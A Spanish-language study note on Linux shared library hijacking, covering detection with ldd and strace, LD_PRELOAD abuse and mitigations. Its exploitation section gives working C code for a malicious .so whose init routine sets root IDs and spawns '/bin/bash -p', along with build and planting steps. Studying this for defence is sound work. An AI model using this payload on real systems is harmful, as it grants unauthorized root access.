
---
Tags:

---
## 📖 Definición

El **secuestro de librerías compartidas** ocurre cuando un binario con privilegios elevados (ej. `setuid root` o servicios del sistema) carga dinámicamente librerías desde rutas controladas por el atacante.  
Si la librería no existe en la ruta esperada, o la precedencia de carga favorece directorios modificables por el usuario, un atacante puede **inyectar código malicioso** en forma de librería `.so`.

---

## 🔎 Conceptos Clave

- **Librerías compartidas en Linux:** Archivos `.so` usados por binarios en tiempo de ejecución.
    
- **Orden de carga:** Controlado por el _runtime linker_ (`ld.so`).
    
- **Vectores típicos de abuso:**
    
    - Variables de entorno como `LD_PRELOAD`, `LD_LIBRARY_PATH`.
        
    - Binarios `setuid` que ignoran protecciones.
        
    - Servicios mal configurados que buscan librerías en rutas inseguras.
        

---

## ⚙️ Detección

1. Listar dependencias de un binario:
    
    `ldd /ruta/al/binario`
    
    Si aparece `not found`, es candidato al secuestro.
    
2. Verificar permisos de las rutas donde busca la librería:
    
    `strace -e openat /ruta/al/binario 2>&1 | grep .so`
    
3. Revisar variables de entorno relacionadas:
    
    `echo $LD_LIBRARY_PATH`
    

---

## 💣 Explotación (Ejemplo Práctico)

Supongamos que el binario `vulnerable` busca `libfoo.so`, pero no existe o el path es controlable.

1. **Crear una librería maliciosa**:
    evil.c
```bash
#include <stdio.h>
#include <stdlib.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```
    
2. **Compilarla como `.so`:**
    
    `gcc -fPIC -shared -o libfoo.so evil.c`
    
3. **Colocar la librería en el directorio cargado por el binario**  
    (ej: `/tmp` si la aplicación busca ahí).
    
4. **Ejecutar el binario vulnerable**  
    → Se abre una shell como root.
    

---

## 🚩 Abuso con `LD_PRELOAD`

Algunos binarios ignoran restricciones y permiten **precargar librerías**:

`LD_PRELOAD=./evil.so /usr/bin/id`

Esto fuerza al binario a cargar tu librería antes que las legítimas.  
⚠️ Si es `setuid root`, la mayoría de veces se ignora `LD_PRELOAD`, salvo que esté mal configurado.

---

## 🛠️ Herramientas Útiles

- `ldd` → dependencias dinámicas.
    
- `strace` → trazado de llamadas al sistema (descubre rutas de búsqueda).
    
- `readelf -d` → tabla de dependencias (`NEEDED`).
    

---

## 📌 Mitigaciones

- Establecer **rutas absolutas** para librerías críticas.
    
- Usar `rpath` o `runpath` en compilación.
    
- Deshabilitar variables de entorno en binarios `setuid`.
    
- Restringir permisos de escritura en directorios de librerías.
    

---

## 🧾 Resumen

- Vulnerabilidad: Binario carga librerías `.so` de rutas inseguras.
    
- Vector: Crear librería maliciosa → obtener RCE o escalada a root.
    
- Clave: Detectar con `ldd` y `strace`.
    
- Mitigación: Configuración segura de paths y permisos.

---
## Herramientas

- Herramienta Uftrace: [Enlace](https://github.com/namhyung/uftrace)
